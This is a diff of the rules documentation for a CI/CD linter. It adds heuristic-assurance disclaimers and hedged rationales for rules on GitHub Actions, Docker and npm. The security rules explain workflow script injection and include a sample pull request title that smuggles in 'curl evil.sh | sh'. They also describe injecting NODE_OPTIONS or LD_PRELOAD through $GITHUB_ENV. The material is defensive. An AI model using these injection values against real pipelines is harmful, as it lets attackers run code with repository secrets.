@@ -5,6 +5,11 @@
 Each rule belongs to a ruleset. Enable presets with `extends`, toggle whole rulesets with `rulesets`, and tune
 individual rules with `rules` in `.github/ci-cd-optimizer.yml`. See [configuration](configuration.md).
 
+All detectors are heuristic and their recommendations are conditional, not universal speedup or correctness proofs.
+The production severity-precedence reducer is mechanically verified; that contract does not prove a rule's detector,
+autofix, or performance claim. See [formal assurance](formal-verification.md) and the exhaustive
+[machine-readable claim catalogue](../formal/rule-assurance.json). Missing or stale entries fail CI.
+
 Presets: `recommended`, `strict`, `agentic`, `github`, `insights`, `all`.
 
 | Rule | Kind | Default | Presets | Fixable | Description |
@@ -146,6 +151,7 @@ Uploaded artifacts should set a short `retention-days` instead of the repository
 
 **Why:** Artifacts are kept for the repository default (90 days unless changed) and count against Actions storage. Agent-driven repositories produce many runs per day, so build outputs that only feed later jobs pile up quickly; a short retention keeps storage and quota headroom without slowing anything down.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low; autofix available
 - Presets: `recommended`, `agentic`
 - Options: `maxDays` (default `7`)
@@ -182,6 +188,7 @@ Pull request workflows should cancel superseded runs; deploy workflows must not.
 
 **Why:** Agents push many small commits. Without a concurrency group every push keeps running to completion, wasting runner minutes and delaying feedback. Deploy and release workflows must never cancel in-progress runs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -249,6 +256,7 @@ Jobs should set `timeout-minutes` well below the 360 minute default.
 
 **Why:** A hung job holds a runner (and every dependent job, merge queue entry, and agent loop) for up to six hours. A tight timeout turns hangs into fast, retryable failures.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `defaultMinutes` (default `30`), `maxMinutes` (default `120`)
@@ -363,6 +371,7 @@ CI workflows that run on `pull_request` should also run on `merge_group`.
 
 **Why:** Agent-heavy repositories open and merge many pull requests at once, so a merge queue is the only practical way to keep the default branch green without serial rebases. A merge queue waits for the required checks to report on the `merge_group` event; a required-check workflow that only listens to `pull_request` never runs there, so queued pull requests stall until they time out.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -394,6 +403,7 @@ Well-known actions should use their current major version, and local JavaScript 
 
 **Why:** Old majors of the official setup, cache, checkout, and artifact actions miss performance work (faster caching backends, parallel artifact uploads) and, below the node24 releases, target Node 20, which GitHub Actions runners removed on 2026-09-23: they now force those actions onto Node 24, which their authors never tested, and warn on every run (self-hosted runners on unsupported platforms cannot run them at all). Agents copy existing workflow snippets, so one stale pin spreads quickly.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -512,6 +522,7 @@ Affected/changed-only commands need the base commit, which a default shallow che
 
 **Why:** `actions/checkout` fetches a single commit by default. Affected-only tooling (nx affected, turbo --affected, pnpm/turbo `[ref]` filters, jest --changedSince, git diff against the base) then either fails with an unknown revision or silently falls back to running everything, which defeats the selection that makes agent-scale CI affordable.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -548,6 +559,7 @@ Full-history checkouts (`fetch-depth: 0`) should use a blobless partial clone (`
 
 **Why:** `fetch-depth: 0` downloads every version of every file ever committed, which dominates checkout time in large or long-lived repositories. A blobless partial clone keeps the full commit graph that history-aware tools (affected detection, changelogs, versioning) need, and fetches file contents lazily only when a command reads them. Agent-driven repositories run many more jobs, so the saving compounds.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`
 
@@ -581,6 +593,7 @@ Jobs that only work inside one workspace package of a large monorepo can use a s
 
 **Why:** In large monorepos most of the checkout is files a package-scoped job never reads. A cone-mode sparse checkout of the package, its workspace dependencies, and shared config keeps checkout and disk usage proportional to the job, which adds up when agents trigger many small package-level runs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Requires: `repository`
@@ -619,6 +632,7 @@ Multi-job pull request workflows in a monorepo should skip jobs whose area did n
 
 **Why:** In a monorepo most pull requests touch one area, yet every job still provisions a runner, restores caches, and installs dependencies. A small change-detection job that feeds job-level `if:` conditions skips the unrelated jobs entirely. Agent-driven repositories open many narrow pull requests, so the savings compound, and an always-run gate job keeps branch protection simple because skipped jobs report success.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 - Requires: `repository`
@@ -675,6 +689,7 @@ Pull request workflows should not skip themselves with trigger-level `paths` fil
 
 **Why:** When `paths`/`paths-ignore` skips a pull request workflow, its checks never report and stay Pending, so a pull request that requires them cannot merge. Agents then stall or someone adds a bypass. Running the workflow on every pull request and skipping work with job-level `if:` conditions keeps the speed benefit: skipped jobs report success, and an always-run gate job gives branch protection one stable check.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -723,6 +738,7 @@ Pull request CI in a monorepo should test only the projects affected by the chan
 
 **Why:** Running every project's tests on every pull request makes CI time grow with the size of the repository instead of the size of the change. Agents open many small pull requests, so affected-only selection (nx affected, turbo --affected, pnpm `[ref]` filters, lerna --since) is the biggest lever for keeping feedback fast and runner minutes bounded.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`
 
@@ -759,6 +775,7 @@ Change-detection steps must not use tj-actions/changed-files versions affected b
 
 **Why:** Change detection runs on every pull request, often with secrets in scope. In March 2025 the tags of tj-actions/changed-files were repointed to a malicious commit that dumped runner memory, including secrets, into workflow logs (CVE-2025-30066). Versions before v46.0.1 are in the advisory's affected range; agents copying an old snippet reintroduce it.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -789,8 +806,9 @@ References:
 
 Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs.
 
-**Why:** Gradle, Maven, Cargo, Bazel, Turborepo and Nx skip downloads and unchanged work when their caches are warm, but hosted runners start empty. Without a cache action or a remote cache, every run (and every agent iteration) rebuilds from scratch.
+**Why:** Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `recommended`, `agentic`
 
@@ -824,8 +842,9 @@ References:
 
 actions/cache keys must invalidate when inputs change and still hit between runs.
 
-**Why:** A static key never changes, so the cache goes stale forever (caches are immutable once saved). A key containing the commit SHA or run id without `restore-keys` misses on every run, paying the upload cost with no benefit. Caching node_modules for `npm ci` is wasted work because `npm ci` deletes node_modules before installing.
+**Why:** A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved. Optional cache-key certificates prove only the declared-dependency string-partition model.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -860,8 +879,9 @@ References:
 
 Docker image builds in CI should import and export a layer cache.
 
-**Why:** Hosted runners start with an empty BuildKit cache, so without `cache-from`/`cache-to` every layer (including dependency installs) is rebuilt on every run. The GitHub Actions cache backend defaults every build to the same `buildkit` scope, so multiple images overwrite each other's cache unless each gets a unique `scope`. Inline cache only supports `mode=min` (final-stage layers); a registry cache with `mode=max` also caches intermediate stages.
+**Why:** Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`
 
@@ -993,8 +1013,9 @@ References:
 
 Language setup actions should cache downloaded dependencies.
 
-**Why:** Without caching, every run re-downloads all dependencies from the registry, which is often the slowest part of a job and is repeated on every agent iteration. setup-node, setup-python, setup-java and setup-dotnet only cache when `cache` is set (setup-node v6+ auto-caches npm only when package.json `packageManager` names npm); setup-go caches by default.
+**Why:** Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high; autofix available
 - Presets: `recommended`, `agentic`
 
@@ -1066,8 +1087,9 @@ References:
 
 Dockerfile base images should use pinned versions (and digests when required).
 
-**Why:** `FROM image` or `FROM image:latest` silently changes whenever upstream publishes, which breaks reproducibility and invalidates the layer cache for every following instruction. A version tag makes upgrades explicit; a digest makes builds fully reproducible.
+**Why:** Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `requireDigest` (default `false`)
@@ -1098,6 +1120,7 @@ CI installs must be locked to the committed lockfile.
 
 **Why:** `npm install` and unfrozen yarn/bun installs can rewrite the lockfile and resolve different versions per run, which breaks reproducibility and cache keys. Frozen installs are also faster.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: medium; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1127,6 +1150,7 @@ Third-party actions and reusable workflows should be pinned to a full commit SHA
 
 **Why:** Tags and branches can be moved, so `@v4` may run different code tomorrow than today, which breaks reproducibility and is a supply-chain risk. A full-length commit SHA is immutable. (OpenSSF Scorecard also treats a tag backed by an immutable release as pinned, but most action tags are not immutable releases and this cannot be verified offline.)
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: low
 - Presets: `strict`
 - Options: `ignoreOwners` (default `[]`)
@@ -1155,8 +1179,9 @@ References:
 
 Job containers and service containers should use pinned image versions.
 
-**Why:** An image with no tag or `:latest` changes whenever upstream publishes, so a job's toolchain or a service's database version can change between two runs of the same commit. A version tag makes upgrades explicit; a digest makes them fully reproducible.
+**Why:** Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `requireDigest` (default `false`)
@@ -1191,6 +1216,7 @@ Jobs should run on a pinned runner image label instead of `*-latest`.
 
 **Why:** `ubuntu-latest`, `windows-latest` and `macos-latest` move to a new OS image during a gradual multi-week rollout, so identical commits can pass on one run and fail on the next with different toolchains and preinstalled software. `ubuntu-latest` is migrating from Ubuntu 24.04 to 26.04 between Oct 19 and Nov 19, 2026. Pinning makes the upgrade a deliberate, reviewable change.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `ubuntu` (default `"ubuntu-24.04"`), `windows` (default `"windows-2025"`), `macos` (default `"macos-15"`)
@@ -1223,6 +1249,7 @@ apt and apk installs in Dockerfiles should skip recommended packages, update and
 
 **Why:** Recommended packages and leftover package indexes add tens of megabytes to every layer that is pushed, pulled, and cached. `apt-get update` in its own RUN creates a layer that BuildKit keeps reusing, so later installs run against a stale index (or fail). Smaller layers mean faster pulls on every ephemeral CI runner and agent sandbox.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: low; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1292,6 +1319,7 @@ Dependency installs and compiles in Dockerfiles should use BuildKit cache mounts
 
 **Why:** When a dependency layer is invalidated, a cache mount (`RUN --mount=type=cache`) lets the package manager reuse previously downloaded packages and compiler output instead of fetching everything again, and keeps those caches out of the image. Cache mounts live in the builder, so on ephemeral hosted runners pair them with a persistent builder or export them (for example with buildkit-cache-dance) to benefit across CI runs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -1358,6 +1386,7 @@ Dockerfiles should install dependencies from manifests and lockfiles before copy
 
 **Why:** BuildKit reuses a layer only while every input above it is unchanged. Copying the whole context before the install means each source edit (every agent iteration) re-downloads and re-installs all dependencies; copying only manifests and lockfiles first keeps the dependency layer cached until dependencies actually change.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`
 
@@ -1438,6 +1467,7 @@ Docker build contexts that are copied into images should have a .dockerignore ex
 
 **Why:** Without a .dockerignore, `COPY . .` sends and hashes the whole context, including `.git`, `node_modules`, and local build output. Every commit, install, or agent scratch file then changes the COPY checksum and invalidates that layer and everything after it, and large contexts slow down every build.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`
 - Requires: `complete-inventory`
@@ -1551,6 +1581,7 @@ Single-stage Dockerfiles that install build toolchains or dev dependencies shoul
 
 **Why:** Compilers, git, and devDependencies are only needed to build. Shipping them makes every pull, push, and layer upload larger and slower (and widens the attack surface). A multi-stage build compiles in a builder stage and copies only artifacts into a slim or distroless runtime stage; BuildKit also builds independent stages in parallel.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `recommended`, `agentic`
 
@@ -1718,6 +1749,7 @@ Dockerfiles that repeat the same base image and toolchain preamble should share 
 
 **Why:** When several services start from the same image and install the same toolchain, every service build and every runner repeats that work and stores its own copy of the layer. Publishing the preamble once as a shared base image (referenced by digest) builds it once, lets every service and agent sandbox pull the identical cached layer, and turns toolchain upgrades into a single reviewed digest bump.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`
 - Requires: `complete-inventory`
@@ -1797,6 +1829,7 @@ Library packages should declare an `exports` map, and ESM libraries a `sideEffec
 
 **Why:** An `exports` map is the package's public API: it blocks deep imports into internals, so packages can be split, moved, and rebuilt independently without breaking consumers, and it lets bundlers and TypeScript resolve the right entry without probing. `sideEffects` tells bundlers which modules are safe to drop, which keeps tree-shaking effective and app bundles (and their build times) small.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`, `agentic`
 
@@ -1842,6 +1875,7 @@ Publishable packages should declare a `files` allowlist (or an `.npmignore`) so 
 
 **Why:** Without an allowlist `npm publish` packs the whole package directory: sources, tests, fixtures, configs, and stray build caches. Bloated tarballs make every install, CI cache restore, and container layer that contains node_modules larger and slower, and can leak files that were never meant to be published. A `files` allowlist keeps composable packages small.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`
 - Requires: `complete-inventory`
@@ -1881,6 +1915,7 @@ Packages with very many dependencies are candidates for decomposition into small
 
 **Why:** A package that pulls in everything is one cache key: any change to it, or to any of its dependencies, reinstalls, rebuilds, and retests the whole thing, and every image that contains it ships all of it. Smaller packages with explicit boundaries let affected-only CI, remote caches, and OCI layers reuse work, which is what keeps agentic edit-test loops fast.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`
 - Options: `maxDependencies` (default `40`), `maxWorkspaceDependents` (default `0`)
@@ -1919,6 +1954,7 @@ Workspace packages should declare each third-party dependency with the same vers
 
 **Why:** When packages in one monorepo ask for different ranges of the same dependency, the lockfile carries several copies, installs and node_modules grow, Docker dependency layers and CI caches fragment by package, and packages behave differently at runtime and in tests. A single version policy keeps one hermetic dependency set that every package and image layer can share.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`
 - Options: `ignore` (default `[]`)
@@ -1959,6 +1995,7 @@ Container images built in CI should be published to GitHub Container Registry (g
 
 **Why:** Publishing to GHCR keeps images next to the code: the workflow's GITHUB_TOKEN can push without long-lived registry secrets, packages inherit organization permissions and link to the repository, and runners pull from GHCR without Docker Hub's anonymous rate limits. Shared base and dependency layers published once to GHCR can then be reused by every service in the monorepo.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: info; impact: low
 - Presets: `github`
 
@@ -2006,6 +2043,7 @@ Internal scoped npm packages should be published to the GitHub npm registry (npm
 
 **Why:** Publishing internal packages to GitHub Packages keeps them next to their source: Actions publish and install with the workflow's GITHUB_TOKEN instead of long-lived npm tokens, access follows organization and repository permissions, and small composable packages can be versioned and consumed independently by every repository and container build in the organization.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: info; impact: low
 - Presets: `github`
 - Options: `scopes` (default `[]`)
@@ -2045,6 +2083,7 @@ Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`,
 
 **Why:** Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2076,6 +2115,7 @@ Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, 
 
 **Why:** Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2117,6 +2157,7 @@ Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messag
 
 **Why:** Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2147,6 +2188,7 @@ Package installs in privileged workflows that hold secrets or a write token shou
 
 **Why:** npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `strict`
 
@@ -2190,6 +2232,7 @@ Tools installed straight from a git repository or `@latest` should be pinned to 
 
 **Why:** Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2221,6 +2264,7 @@ References:
 
 **Why:** By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`
 
@@ -2260,6 +2304,7 @@ Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment`
 
 **Why:** The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `strict`
 
@@ -2301,6 +2346,7 @@ Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` 
 
 **Why:** `toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2333,6 +2379,7 @@ References:
 
 **Why:** These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a "pwn request"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2380,6 +2427,7 @@ Avoid chaining workflows with `workflow_run` when the downstream work could be a
 
 **Why:** A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2417,6 +2465,7 @@ Avoid throttling a matrix with a `max-parallel` far below its number of legs.
 
 **Why:** A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 - Options: `maxRatio` (default `4`)
@@ -2451,6 +2500,7 @@ Skip expensive pull request jobs while the pull request is still a draft.
 
 **Why:** Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 - Options: `maxSteps` (default `10`), `maxTimeout` (default `15`)
@@ -2493,6 +2543,7 @@ Do not re-run build and test workflows on pull request metadata events such as l
 
 **Why:** Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -2525,6 +2576,7 @@ Avoid scheduled workflows that run more often than every 15 minutes.
 
 **Why:** A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `maxRunsPerHour` (default `4`)
@@ -2558,6 +2610,7 @@ Let sharded pull request test matrices stop early when one shard fails.
 
 **Why:** When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -2591,6 +2644,7 @@ Gate matrix jobs on the workflow's existing change-detection job.
 
 **Why:** When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
